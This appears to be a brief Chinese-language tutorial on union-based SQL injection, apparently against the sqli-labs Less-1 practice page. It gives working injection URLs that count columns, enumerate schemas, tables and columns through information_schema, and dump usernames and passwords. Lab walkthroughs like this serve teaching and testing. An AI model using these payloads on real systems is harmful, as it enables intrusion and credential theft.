sql注入联合查询

#联合查询注入#
联合查询的前提是必须有显示位
union可合并两个或多个select语句的结果集，
前提是两个select必有相同列、且各列的数据类型也相同
注入步骤

  • 1先判断是否存在sql注入，加上’

  • 有错误

  • 判断他有多少个字段
    ‘ Order by 3
  • 有3个字段，4会出错

    http://172.21.50.66/Less-1/?id=100000‘ union select 1,version(),3 –+
  • 利用information_schema
    http://172.21.50.66/Less-1/?id=100000‘ union select 1,2,table_name from information_schema.tables –+
    http://172.21.50.66/Less-1/?id=100000‘ union select 1,2,group_concat(distinct+table_schema) from information_schema.tables –+ 获取数据库的名字
  • 知道数据库的名字然后就可以爆出数据库中的表
    http://172.21.50.66/Less-1/?id=100000‘ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+

    http://172.21.50.66/Less-1/?id=100000‘ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+
  • Users表中的字段列

    http://172.21.50.66/Less-1/?id=100000‘ union select 1,2,group_concat(username,0x20,password) from security.users–+可以爆出users表中的用户名和密码
